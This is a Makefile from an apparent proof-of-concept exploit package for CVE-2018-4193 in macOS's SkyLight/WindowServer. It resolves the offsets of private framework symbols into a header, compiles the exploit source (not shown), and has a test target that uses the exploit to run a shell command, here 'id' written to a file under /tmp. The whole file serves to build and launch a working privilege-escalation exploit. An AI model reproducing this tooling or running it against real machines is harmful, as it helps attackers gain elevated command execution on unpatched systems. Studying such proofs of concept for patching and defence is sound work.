SYMBOLS=SLPSRegisterForKeyOnConnection CGSGetConnectionPortById
SYMBOLS_OFFSETS=$(foreach x, $(SYMBOLS),$$'\n'\\\#define $(x)_OFFSET `nm -debug-syms /System/Library/PrivateFrameworks/SkyLight.framework/SkyLight  | sed -nE 's/([0-9a-f]+) . _$(x)/0x\\1/p' | grep 0x || { echo error: symbol $(x) was not found >&2 ; echo ERROR ; } `)

exploit: exploit.m offsets.h
	gcc exploit.m -O2 -Wall -Werror -Wno-unused-function -o exploit -framework cocoa

offsets.h:
	@echo $(SYMBOLS_OFFSETS) > offsets.h
	@grep ERROR offsets.h > /dev/null && { rm offsets.h ; exit 1 ; } || exit 0

/tmp/poc-CVE-2018-4193:
	@mkdir $@

test: exploit /tmp/poc-CVE-2018-4193
	@./exploit "id > /tmp/poc-CVE-2018-4193/id ; chmod 777 /tmp/poc-CVE-2018-4193/id"
	@cat /tmp/poc-CVE-2018-4193/id
	@rm -r /tmp/poc-CVE-2018-4193

clean:
	@rm exploit offsets.h 2> /dev/null || exit 0
